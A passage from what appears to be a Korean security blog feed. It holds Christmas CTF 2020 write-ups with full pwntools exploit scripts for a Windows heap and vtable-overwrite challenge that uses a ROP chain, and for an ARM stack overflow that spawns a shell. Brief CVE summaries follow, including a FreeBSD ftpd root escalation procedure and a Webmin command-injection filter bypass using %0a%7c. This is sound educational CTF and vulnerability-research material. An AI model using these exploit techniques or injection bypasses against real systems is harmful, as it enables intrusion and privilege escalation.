class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span><span class="hljs-comment"># leak ucrtbase</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</code></pre><p><img src="/2020/12/29/l0ch/address_book/12.png"></p><p>이제 필요한 주소들도 모두 구했고 eip도 컨트롤할 수 있으니, ROP chain만 구성하면 됩니다.</p><p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> 로 rsp를 현재 페이로드가 올라와 있는 주소로 pivot 한뒤 <code>read</code>, <code>write</code>를 차례로 호출하면 flag를 출력할 수 있습니다!</p><p><img src="/2020/12/29/l0ch/address_book/13.png"></p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addAddr</span>(<span class="hljs-params">name, address, city</span>):</span>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(name)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(address)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(city)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))p.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deleteAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restoreAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifyAddr</span>(<span class="hljs-params">idx, item, new</span>):</span>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(item))p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(new)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-number">55555</span>)print(p.recv())p.sendline(<span class="hljs-string">&quot;L0ch&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<span class="hljs-comment"># node 3-&gt;4 , node 4-&gt;3</span>deleteAddr(<span class="hljs-number">4</span>)deleteAddr(<span class="hljs-number">3</span>)restoreAddr(<span class="hljs-number">4</span>)restoreAddr(<span class="hljs-number">3</span>)<span class="hljs-comment"># reference count ingeter overflow - free addressbook</span>listAddr(<span class="hljs-number">3275</span>)<span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)pivot = ntdll + <span class="hljs-number">0xA0E24</span> <span class="hljs-comment"># mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</span>ret = ntdll + <span class="hljs-number">0x144F</span>add_rsp_28h = ntdll + <span class="hljs-number">0x3EDC</span>ppr = ntdll + <span class="hljs-number">0x8B8F0</span> <span class="hljs-comment"># pop rdx rcx r8 r9 r10 r11 ret</span>read = ucrtbase + <span class="hljs-number">0x17BC0</span>write = ucrtbase + <span class="hljs-number">0x174C0</span> <span class="hljs-comment"># pivot</span>payload = p64(pivot)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ret)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)<span class="hljs-comment"># arg 2, buffer </span>payload += p64(<span class="hljs-number">0x3</span>)<span class="hljs-comment"># arg 1, fd</span>payload += p64(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># arg 3, size</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(read)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># write flag</span>payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)payload += p64(<span class="hljs-number">1</span>)payload += p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(write)<span class="hljs-comment"># overwrite vtable</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,p64(obj_leak+<span class="hljs-number">152</span>))p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;-1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(p64(obj_leak+<span class="hljs-number">152</span>))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">136</span>+p64(obj_leak+<span class="hljs-number">168</span>)+payload)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;6&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recv())</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - baby-RudOlPh</title>
    <link href="/2020/12/29/l0ch/baby_rudolph/"/>
    <url>/2020/12/29/l0ch/baby_rudolph/</url>
    
    <content type="html"><![CDATA[<p>baby_RudOlPh는 baby 시리즈 답게 이번 Christmas CTF에서 가장 많은 솔버가 나왔던 문제 중 하나입니다.<br><img src="/2020/12/29/l0ch/baby_rudolph/1.png"></p><p>바이너리를 받고 보호기법과 아키텍쳐를 확인해보면 64bit ARM이고, NX bit만 걸려있는걸 확인할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/2.png"><br>분석해보면 vuln이라는 함수를 대놓고 줍니다. read 함수를 호출하는데 0x100만큼 받아서 stack overwflow가 발생하네요</p><p><img src="/2020/12/29/l0ch/baby_rudolph/3.png"></p><p><code>get_arm</code> 함수를 보면 첫 번째 인자의 값이 <code>0x1225</code> 면 <code>system(&quot;/bin/sh&quot;)</code>을 실행해 쉘을 획득할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/baby_rudolph/4.png"></p><p><code>ARMmaker</code> 함수에는 인자를 세팅 할 수 있는 gadget이 있네요.</p><ol><li><code>vuln</code> 의 return address를 <code>ARMmaker</code>의 gadget으로 overwrite</li><li>gadget을 통해 인자를 <code>0x1225</code>로 세팅하고 <code>get_arm</code> 호출</li><li>get shell!</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = process(<span class="hljs-string">&quot;./baby_RudOlPh&quot;</span>)context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p.recvuntil(<span class="hljs-string">&quot;\\n&quot;</span>)payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">72</span>payload += p64(<span class="hljs-number">0x400724</span>)payload += p64(<span class="hljs-number">0x1225</span>) + <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">16</span>payload += p64(<span class="hljs-number">0x400738</span>)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/29/l0ch/baby_rudolph/5.png"></p><p>뉴비용 포너블 문제를 내려는데 그냥 내면 심심해서 64bit ARM으로 내봤습니다 ㅎㅎ 역시 많은 분들이 풀어주셨습니다! </p><p>(문제 만드는 시간보다 도커에 세팅하는데 드는 시간이 더 오래 걸렸던 건 비밀..)</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Picky Eater</title>
    <link href="/2020/12/29/l0ch/picky_eater/"/>
    <url>/2020/12/29/l0ch/picky_eater/</url>
    
    <content type="html"><![CDATA[<p>picky_eater는 snake game을 윈도우 콘솔로 구현한 미스크 문제입니다.</p><blockquote><p>옛날옛날에 먹고싶은 것만 먹는 편식쟁이 뱀이 있었어요 편식쟁이 뱀은 먹기 싫은걸 먹으면 티를 낸답니다!</p></blockquote><p>위와 같은 문제의 디스크립션과 함께 바이너리가 주어집니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/1.png"></p><p>바이너리를 실행하면 위와 같은 화면이 나오는데, 아무키나 누르면 snake 게임이 시작됩니다.</p><p>snake 게임의 룰은 간단합니다! 처음엔 짧은 길이의 뱀이 나오는데, 이 뱀을 컨트롤해 화면상에 나오는 먹이를 먹으면 뱀 길이가 길어지고 뱀의 속도가 빨라지는 간단한 룰이죠</p><p><img src="/2020/12/29/l0ch/picky_eater/2.png"></p><p>뱀의 먹이로는 문자가 하나씩 나옵니다. 문자들을 하나씩 모아보면<code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> 라는 플래그가 나오는데, 이 플래그를 인증하면 인증에 실패하게 됩니다.</p><p>진짜 플래그는 게임의 규칙을 통해 얻을 수 있는데, 문제의 디스크립션을 다시 한 번 볼까요?</p><blockquote><p>옛날옛날에 먹고싶은 것만 먹는 편식쟁이 뱀이 있었어요 편식쟁이 뱀은 먹기 싫은걸 먹으면 티를 낸답니다!</p></blockquote><p>먹이를 먹으면 다음과 같은 변화가 발생합니다.</p><ol><li>길이가 길어짐</li><li>속도가 빨라짐</li></ol><p>속도는 육안으로 확인하기 어려울 것 같으니, 길이와 관련된 규칙을 생각하며 플레이해봅시다.</p><p>처음 길이는 머리를 제외하고 4칸입니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/3.png"></p><p>첫 번째 먹이인 <code>X</code> 를 먹고 P로 일시정지를 해보겠습니다.</p><p>뱀의 길이가 6으로 두 칸 길어졌네요. 이렇게 <code>XMAS&#123;$</code> 까지 먹어보겠습니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/4.png"></p><p>길이가 16이니까 XMAS{$ 를 먹었을땐 모두 길이가 길어진 것을 확인이 가능합니다. </p><p><img src="/2020/12/29/l0ch/picky_eater/5.png"></p><p>그러나 <code>0</code> 을 먹었을때는 길이가 16 그대로군요. 이렇게  <code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> 중 먹었을 때 길이가 늘어나지 않는 문자를 빼면 <code>XMAS&#123;$o_P1cky_$n4k3!&#125;</code> 라는 진짜 플래그가 나오게 됩니다!</p><p><img src="/2020/12/29/l0ch/picky_eater/6.png"></p><p>참고로 IDA에서 분석해보면 fake flag가 있고</p><p><img src="/2020/12/29/l0ch/picky_eater/7.png"></p><p>플래그 index 가 있는 배열이 있어 이걸 보고 풀어도 됩니다.</p><p>여담으로.. fake flag를 너무 진짜처럼 넣어놓는 바람에.. picky_eater가 공개되자마자 플래그 인증요청과 문의가 폭주해서 정신을 못차렸었네요 하하..</p><p><img src="/2020/12/29/l0ch/picky_eater/8.png"></p><blockquote><p>간단요약짤 - picky_eater 공개 10분 뒤 문제 별 플래그 인증요청횟수(태그 클라우드)</p></blockquote><p>플래그 인증 관련해서 문제가 없다는 공지를 올린 이후 많은 팀들이 풀어주셨지만, 문제 출제 중 미처 생각 못한 점 때문에 참가자분들께 혼란을 드려 반성하고 있습니다 ㅠㅠㅠ</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>write-up</tag>
      
      <tag>christmas ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-7468: FreeBSD local privilege escalation</title>
    <link href="/2020/12/29/l0ch/2020-12-29/"/>
    <url>/2020/12/29/l0ch/2020-12-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/12/21/cve-2020-7468-turning-imprisonment-to-advantage-in-the-freebsd-ftpd-chroot-jail">CVE-2020-7468: TURNING IMPRISONMENT TO ADVANTAGE IN THE FREEBSD FTPD CHROOT JAIL</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>FreeBSD ftpd</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>FreeBSD의 ftp 데몬에서 root 로 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>취약점은 <code>chroot</code> 함수의 로그인 처리 부분의 결함으로 인해 발생합니다.</p><p><code>chroot</code> 함수에서 <code>chdir</code>이 실패할 경우 ftpd는 <code>chroot</code>의 jail에서 새로운 로그인 연결을 기다립니다. 이를 이용해 강제로 <code>chdir</code>이 실패하도록 유도하면 해커가 업로드한 파일을 시스템 파일인 것처럼 속일 수 있습니다.</p><p>취약점의 상세 공격 단계는 다음과 같습니다.</p><ol><li>해커가 FTP 유저 계정으로 로그인합니다.</li><li><code>etc/spwd.db</code> 에 임의의 root 패스워드를 설정해 업로드합니다.</li><li><code>chmod 0</code> 으로 홈 디렉터리에 대한 권한을 변경하고 유저 계정으로 다시 로그인합니다.</li><li>3번으로 인해 로그인 중 <code>chdir</code>이 실패하고 <code>ftpd chroot jail</code> 내부에서 새로운 연결을 기다립니다. 이후 모든 시스템 파일 액세스는 해커 계정의 홈 디렉터리를 기준으로 이루어집니다.</li><li>결과적으로 이후 root로 로그인할 때 해커가 업로드한 <code>etc/spwd.db</code> 의 root 패스워드 테이블을 참조해 패스워드를 검증하고 해커가 root 계정에 접근할 수 있습니다.</li></ol><p>해당 취약점을 악용하면 리버스쉘을 실행시키는 명령어를 포함한 파일을 업로드해 root 권한으로 쉘을 실행하고, chroot jail을 벗어나 임의의 명령어 또한 실행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>FreeBSD</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>ftpd</tag>
      
      <tag>chroot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35606: Arbitrary Command Execution in Webmin</title>
    <link href="/2020/12/28/idioth/2020-12-28/"/>
    <url>/2020/12/28/idioth/2020-12-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html">Webmin-1962-PU-Escape-Bypass-Remote-Command-Exectuion</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wemin 1.962 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Webmin에서 Remote Command Execution 취약점이 발견되었습니다. 해당 취약점을 통해 패키지 업데이트 모듈을 사용할 수 있는 모든 유저가 root 권한으로 arbitrary command를 실행할 수 있습니다. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840">CVE-2019-12840</a>에 대한 필터링은 package name 변수가 system command 안에 직접적으로 들어가므로 URL encoding을 통해 우회할 수 있습니다.(ex. command line을 한 줄 아래에서 실행)</p><p><code>u</code> 파라미터는 <code>update.cgi</code>에서 <code>@pkgs</code> 변수에 들어가서 여러 연산을 수행합니다. <code>update.cgi</code>의 함수들은 <code>package-updates-lib.pl</code>에서 호출되는데, 그중 <code>package_install(package-name, [system], [new-install])</code>은 update system이나 Wemin을 통해 패키지를 설치할 수 있고 업데이트된 패키지 목록을 반환합니다.</p><p>패지키를 설치할 때 CVE-2019-12840에 대한 조치로 <code>s/\\(-)|\\(.)/string/g;</code> 필터링이 걸려있습니다. 패키지 이름은 http request 변수이므로 <code>%0a</code>나 <code>%0c</code> 등을 통해 escape가 가능합니다. 패키지 이름 뒤에 <code>%7c</code> 등으로 pipe나 <code>.</code>을 추가하면 그 부분에 <code>\</code> 백 슬래시가 추가되어 명령 실행이 불가능하지만 <code>%0a%7c</code> 등으로 새로운 command line에서 실행하면 <code>\</code>가 무시되고 정상적으로 arbitrary command execution이 가능합니다.</p><p><a href="https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb">해당 취약점에 대한 Metasploit code</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>command execution</tag>
      
      <tag>cve-2019-12840</tag>
      
      <tag>webmin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8437: uTorrent vulnerability, misparse to RCE</title>
    <link href="/2020/12/19/fabu1ous/2020-12-19/"/>
    <url>/2020/12/19/fabu1ous/2020-12-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-vulnerability.html">CVE-2020-8437 Vulnerability And Exploit Overview</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>uTorrent &lt;= 3.5.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-8437은 uTorrent의 peer끼리 주고받는 BitTorrent protocol에서 발견된 취약점입니다. BitTorrent protocol을 시작하는 Handshake 페킷에는 bencoded dictionary를 담고 있는 <code>M field</code>가 존재합니다.</p><p>bencoded dictionary는 python dictionary와 매우 유사하며 Key와 Value를 갖습니다. 여기서 중요한 점은 nested(중첩된) dictionary의 존재인데, 즉 Value가 또 다른 하나의 dictionary가 될 수 있습니다. 중첩된 dictionary를 파싱하는 과정에서 발생하는 취약점입니다.</p><pre><code class="hljs Bencoded">d4:keyA 6:valueA4:keyBd5:apple 3:pie6:orange 5:juiceee</code></pre><p>충접된 dictionary를 파싱 할 때 몇 번째 layer에서 파싱하고 있는지를 32bit 크기의 <code>bit field</code>에 기록합니다. layer를 하나 들어갈 때마다 이 bit field에 한 비트씩 플래그를 설정합니다( ex. 2번째 layer 파싱 중 : 0000 0000 0000 0011 ). 만약 layer가 32보다 많이 중첩된 dictionary를 파싱하게 된다면 Crash가 발생합니다.</p><p>malicious bencoded dictionary를 담은 <code>.torrent</code>를 받는 peer의 uTorrent는 nested dictionary를 파싱하는 과정에서 Crash가 발생하고 RCE까지 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>utorrent</tag>
      
      <tag>misparse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Adobe Reader UAF vulnerability</title>
    <link href="/2020/12/18/l0ch/2020-12-18/"/>
    <url>/2020/12/18/l0ch/2020-12-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Adobe Reader </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Adobe Reader에서 원격 코드 실행까지 가능한 UAF 취약점이 발견되었습니다.</p><p><code>ESObjects</code> 는 Adobe Reader의 <code>EScript</code> 객체입니다. <code>ESObjects</code>를 구성할 때 해당 객체에 대한 포인터가 캐시에 저장됩니다. 동일한 PDDoc구조, 이름을 가진 <code>ESObject</code>를 구성할 때 새로 할당하는 대신 캐시의 <code>ESObject</code> 포인터가 사용되는데, 이때 UAF 취약점이 발생합니다.</p><p><code>ESObject</code>가 할당되고 객체 캐시에 추가될 때 <code>ESString type</code>은 ANSI입니다. 객체 캐시에서 <code>ESObject</code>를 삭제할 때 <code>ESString</code> 값으로 찾아 삭제하는데, 삭제할 항목을 검색할 때  UNICODE로 입력받아 <code>ESString</code> 항목을 찾지 못하게 됩니다. 결과적으로 <code>ESObject</code> 포인터는 삭제되지 않고, 이를 재사용할 수 있습니다.</p><p>해당 취약점은 ArrayBuffer byteLength corruption과 heap spray로 트리거해 RCE가 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>javascript</tag>
      
      <tag>uaf</tag>
      
      <tag>adobe reader</tag>
      
      <tag>heap spray</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft Teams Updater Living off the Land</title>
    <link href="/2020/12/17/idioth/2020-12-17/"/>
    <url>/2020/12/17/idioth/2020-12-17/</url>
    
